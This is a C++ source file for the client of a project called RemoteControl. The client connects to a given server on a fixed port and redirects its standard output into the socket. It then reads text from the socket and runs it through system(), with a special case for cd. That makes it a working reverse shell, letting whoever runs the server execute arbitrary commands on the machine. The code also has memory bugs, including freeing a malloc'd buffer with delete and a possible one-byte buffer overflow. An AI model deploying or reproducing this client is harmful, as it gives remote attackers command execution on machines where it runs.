/*
 * Created by Nicolas Fez for RemoteControl.
 * Started on 23/10/2018.
 */

#include <RemoteControl.hh>
#include <string>
#include <RemoteControlException.hpp>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <zconf.h>
#include <mutex>
#include <iostream>
#include <sstream>
#include <vector>
#include "Client.hh"

Client::Client(std::string const &serverAddress)
{
    this->setServerAddress(serverAddress);
    if ((this->addr = (struct sockaddr_in *) malloc(sizeof(*(this->getAddr())))) == nullptr)
        throw RemoteControlException(std::string(MALLOC_ERROR));
    if ((this->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        throw RemoteControlException(std::string(SOCKET_ERROR));
    if (inet_addr(this->getServerAddress().c_str()) == -1)
    {
        struct hostent *he;
        struct in_addr **addrList;

        if ((he = gethostbyname(this->getServerAddress().c_str())) == nullptr)
            throw RemoteControlException(GETHOSTBYNAME_ERROR);
        addrList = (struct in_addr **) he->h_addr_list;
        for (int i = 0; addrList[i] != nullptr; i++)
        {
            this->addr->sin_addr = *addrList[i];
            break;
        }
    }
    else
        this->addr->sin_addr.s_addr = inet_addr(this->getServerAddress().c_str());
    this->addr->sin_family = AF_INET;
    this->addr->sin_port = htons(REMOTECONTROL_PORT);
    std::cout << this->getServerAddress().c_str() << std::endl;
    if (connect(this->getFd(), (struct sockaddr *) this->getAddr(), sizeof(*(this->getAddr()))) == -1)
        throw RemoteControlException(CONNECT_ERROR);
    if (dup2(this->getFd(), 1) == -1)
        throw RemoteControlException(DUP2_ERROR);
}

Client::Client(Client const &other)
{
}

Client::~Client()
{
    if (this->addr != nullptr)
        delete this->addr;
    if (this->fd != -1)
        close(this->fd);
}

Client Client::operator=(Client const &other)
{
    return *this;
}

void Client::readContent()
{
    char buf[4096];
    fd_set set;
    ssize_t ret;
    struct timeval timeout;
    std::mutex mutex;
    std::string data;

    timeout.tv_sec = 0;
    timeout.tv_usec = 10000;
    FD_ZERO(&set);
    FD_SET(this->getFd(), &set);
    while (true)
    {
        if (select(this->getFd() + 1, &set, NULL, NULL, &timeout) > 0)
        {
            bzero(buf, sizeof(buf));
            if ((ret = read(this->getFd(), buf, sizeof(buf))) < 0)
                break;
            buf[ret] = '\0';
            if (buf[0] == '\0')
                break;
            data += buf;
        }
        else
            break;
    }
    std::stringstream stream = std::stringstream(data);
    std::vector<std::string> words;
    std::string word;
    while (stream >> word)
        words.push_back(word);
    if (words.size() == 2 && words[0] == "cd")
        chdir(words[1].c_str());
    else if (!data.empty())
        system(data.c_str());
}

void Client::run()
{
    this->setRunningStatus(true);
    while (this->getRunningStatus())
    {
        this->readContent();
    }
}

struct sockaddr_in *Client::getAddr() const
{
    return this->addr;
}

void Client::setAddr(struct sockaddr_in *addr)
{
    this->addr = addr;
}

std::string const &Client::getServerAddress() const
{
    return this->serverAddress;
}

void Client::setServerAddress(std::string const &serverAddress)
{
    this->serverAddress = serverAddress;
}

const int Client::getFd() const
{
    return this->fd;
}

void Client::setFd(const int fd)
{
    this->fd = fd;
}

const bool Client::getRunningStatus() const
{
    return this->runningStatus;
}

void Client::setRunningStatus(const bool runningStatus)
{
    this->runningStatus = runningStatus;
}
